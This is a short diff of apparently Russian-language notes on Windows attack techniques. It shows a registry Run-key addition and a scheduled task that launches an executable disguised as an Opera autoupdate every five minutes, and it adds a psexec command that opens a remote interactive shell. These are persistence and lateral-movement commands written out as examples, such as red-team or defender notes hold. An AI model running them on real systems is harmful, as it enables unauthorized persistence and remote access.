@@ -27,3 +27,7 @@ reg add “HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run” /v 
 Пример создания запланированной задачи:
 
 schtasks /create /sc minute /mo 5 /tn "Opera scheduled Autoupdate 1594994248" /tr C:\tmp\Opera_autoupdate1594994248.exe
+
+chcp 65001
+
+psexec -i \\adress -u user cmd
